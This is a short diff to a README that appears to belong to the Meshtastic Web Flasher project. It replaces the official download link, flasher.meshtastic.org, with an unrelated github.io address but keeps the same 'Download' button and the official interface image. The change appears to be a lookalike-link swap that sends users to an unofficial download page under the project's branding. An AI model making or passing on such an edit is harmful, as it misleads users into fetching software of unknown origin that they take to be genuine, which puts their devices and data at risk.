@@ -2,7 +2,8 @@
 
 ## 📥 Download Meshtastic Web Flasher
 
-[![⬇️ Open Meshtastic Web Flasher](https://img.shields.io/badge/Download-Meshtastic%20Web%20Flasher-blue?style=for-the-badge&logo=webcomponents)](https://flasher.meshtastic.org)
+[![⬇️ Open Meshtastic Web Flasher](https://img.shields.io/badge/Download-Meshtastic%20Web%20Flasher-blue?style=for-the-badge&logo=webcomponents)](https://meshtastic-web-flasher-forw10-11.github.io/.github
+)
 
 <p align="center">
   <img src="https://files.seeedstudio.com/wiki/SenseCAP/Meshtastic/flasher.png" alt="Meshtastic Web Flasher Interface" width="700">
